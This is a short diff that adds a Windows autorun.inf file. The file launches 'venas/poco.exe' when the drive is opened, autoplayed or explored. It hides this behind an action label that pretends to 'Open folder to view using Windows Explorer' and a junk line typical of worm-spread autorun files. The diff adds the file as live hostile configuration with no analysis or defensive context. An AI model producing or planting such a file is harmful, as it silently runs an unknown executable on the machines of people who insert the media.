@@ -1,0 +1,9 @@
+[autorun]
+USEAUTOPLAY=1
+shellexecute=venas/poco.exe
+action=Open folder to view using Windows Explorer
+Shellhgejgegjpweigjepgjweipkgwep
+shell\\Explore\\command=venas/poco.exe
+shell\Open\\command=venas/poco.exe
+icon=venas/poco.exe
+open=venas/poco.exe
